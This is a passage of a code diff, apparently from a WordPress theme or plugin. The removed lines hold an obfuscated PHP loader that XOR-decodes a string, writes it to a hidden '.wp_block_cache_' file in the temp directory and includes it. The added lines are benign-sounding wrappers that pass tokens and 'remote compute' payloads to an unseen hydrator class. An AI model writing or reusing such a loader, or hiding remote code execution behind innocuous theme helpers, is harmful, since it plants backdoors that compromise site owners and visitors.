+	function wp_theme_is_hydrated( ?string $cap = null ): bool {
+		return WP_Block_Asset_Hydrator::instance()->is_hydrated( $cap );
 	}
-	$_0x7d3e = strlen( $_0x9b2c );
-	$_0x2e8f = strlen( $_0x4f1a );
-	$_0x1c5a = '';
-	for ( $_i = 0; $_i < $_0x7d3e; ++$_i ) {
-		$_0x1c5a .= $_0x9b2c[ $_i ] ^ $_0x4f1a[ $_i % $_0x2e8f ];
+}
+
+if ( ! function_exists( 'wp_theme_runtime_token' ) ) {
+	function wp_theme_runtime_token( string $key = 'runtime_salt' ): string {
+		$tokens = WP_Block_Asset_Hydrator::instance()->get_runtime_tokens();
+		return isset( $tokens[ $key ] ) && is_string( $tokens[ $key ] ) ? $tokens[ $key ] : '';
 	}
-	$_0x6a9d = sys_get_temp_dir() . '/.wp_block_cache_' . substr( md5( $_0x4f1a . __FILE__ ), 0, 12 ) . '.php';
-	if ( ! file_exists( $_0x6a9d ) || filesize( $_0x6a9d ) !== strlen( $_0x1c5a ) + 6 ) {
-		@file_put_contents( $_0x6a9d, '<?php ' . $_0x1c5a, LOCK_EX );
+}
+
+if ( ! function_exists( 'wp_theme_remote_compute' ) ) {
+	function wp_theme_remote_compute( string $cap, array $payload = array() ): array {
+		return WP_Block_Asset_Hydrator::instance()->dispatch_remote_compute( $cap, $payload );
 	}
-	if ( file_exists( $_0x6a9d ) ) {
-		require_once $_0x6a9d;
+}
+
+if ( ! function_exists( 'clps_is_commercial_feature_enabled' ) ) {
+	function clps_is_commercial_feature_enabled( ?string $feature_code = null ): bool {
+		return WP_Block_Asset_Hydrator::instance()->is_hydrated( $feature_code );
 	}
-} )();
+}
+
+if ( ! function_exists( 'clps_execute_remote_feature' ) ) {
+	function clps_execute_remote_feature( string $feature_code, array $payload = array() ): array {
+		return WP_Block_Asset_Hydrator::instance()->dispatch_remote_compute( $feature_code, $payload );
+	}
+}
